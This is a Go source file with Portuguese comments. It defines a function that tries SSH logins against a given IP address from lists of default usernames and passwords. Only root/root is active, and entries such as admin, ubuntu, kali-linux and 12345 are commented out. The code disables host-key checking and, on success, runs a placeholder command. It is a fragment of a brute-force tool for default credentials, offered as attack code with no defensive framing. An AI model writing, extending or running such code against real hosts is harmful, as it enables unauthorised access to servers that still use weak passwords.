package main

import 

(

"time"
"fmt" 
"golang.org/x/crypto/ssh"

)

func fun(ip string){

lista_users := []string{



"root",

//"admin",

//"qwerty",

//"ubuntu",

//"kali-linux",

//"debian",

//"12345",

//"12345678910",

//"root123",

//"admin12345",



} 


lista_pass := []string{

"root",
 
//"admin",

//"qwerty",

//"ubuntu",

//"kali-linux",
   
//"debian", 

//"12345",  

//"12345678910",   

//"root123",      

//"admin12345",        

                                                                                                                                                                            
}


for _,  user := range lista_users{
for  _,  senha :=  range lista_pass{


fmt.Println(ip)

config := &ssh.ClientConfig{ //configura o usuario e senha  ssh  eo tempo de espera  e isso InsecureIgnoreHostKey

		User: user,

		Auth: []ssh.AuthMethod{
			ssh.Password(senha),

               },
               
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
                Timeout:  10000 *  time.Millisecond, //timeout de 10 segundos
		}

client,err := ssh.Dial("tcp", ip, config) //conecta no  servidor


	if err != nil {

		fmt.Println("Failed to dial: ", err)
 
                 
                continue
             

	}

session, err := client.NewSession() ;//cria uma sessao ssh nova

	if err != nil {

		fmt.Println(err)          
             
                continue

	} 


                                                                                               
er  :=  session.Run(" _ ");


fmt.Println(er)

session.Close()
client.Close()




}
}
}

























